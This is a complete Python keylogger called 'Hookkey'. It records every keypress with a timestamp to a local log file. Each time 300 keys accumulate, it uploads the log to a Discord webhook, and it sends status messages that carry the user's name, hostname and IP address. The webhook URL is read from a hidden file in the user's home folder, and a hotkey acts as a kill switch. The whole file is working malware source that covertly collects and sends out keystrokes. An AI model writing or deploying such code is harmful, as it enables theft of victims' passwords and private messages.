import keyboard as kb
from pathlib import Path
import getpass
import socket
import requests
import time
import os

stop_logging = False
WEBHOOK_URL = "discord_webhook_url_placeholder"  # Placeholder URL, will be replaced by the actual URL from the main.dependency file
log_file_path = "log.txt"
settings_name = "Source\main.dependency"

def connect():
    global WEBHOOK_URL
    file_path = Path.home() / settings_name
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if file_path.exists():
        try:
            with file_path.open('r') as file:
                url = file.readline().replace("\n","").strip()
                WEBHOOK_URL = url
                keylog()
        except:
            pass
    else:
        print("Error connecting maybe no url is presented")
                

def kill_switch():
    global stop_logging
    clear_log_file(log_file_path)
    stop_logging = True

kb.add_hotkey('ctrl+alt+z', kill_switch)

def clear_log_file(file_path):
    with open(file_path, 'w') as f:
        pass  

def send_message(content):
    username = getpass.getuser()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    timestamp = time.ctime()
    message = f"""**{content}**
    👤 User: `{username}`
    💻 Hostname: `{hostname}`
    🌐 IP: `{ip_address}`
    🕒 Time: `{timestamp}`
    """
    try:
        payload = {"content": message}
        response = requests.post(WEBHOOK_URL, json=payload)
        print("Message sent:", response.status_code)
    except Exception as e:
        print("Error sending message:", e)

def count_logged_lines(file_path):
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            return len(lines)
    except FileNotFoundError:
        return 0 

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            payload = {
                "content": "📄 300 keys have been logged. Uploading log file."
            }
            files = {
                "file": (os.path.basename(file_path), f)
            }
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            print("Logs sent:", response.status_code)
            clear_log_file(log_file_path)
    except Exception as e:
        print("Failed to send log:", e)

def keylog():
    global stop_logging

    send_message("Hookkey is running")

    with open("log.txt", 'a') as log_f:
        log_f.write("-----------------------Keyboard Log-----------------------\n")

        def on_press(key_event):
            global stop_logging
            key_name = key_event.name
            curr_time = time.ctime()
            log_f.write(f"{curr_time} : {key_name}\n")
            log_f.flush()

            line_count = count_logged_lines(log_file_path)

            if line_count >= 301:
                send_to_discord(log_file_path)

        kb.on_press(on_press)

        # Keep running until stop_logging is True
        while not stop_logging:
            time.sleep(0.1)

        # Unhook keyboard and exit
        kb.unhook_all()
        send_message("**Kill switch has been initiated, Hookkey has been stopped**")

# Run in a separate thread to allow clean exit
if __name__ == "__main__":
    try:
        connect()
    except KeyboardInterrupt:
        print("Force stopped")
    except Exception as e:
        print("Error:", e)
    finally:
        os._exit(0)  # Force kill all threads if still running
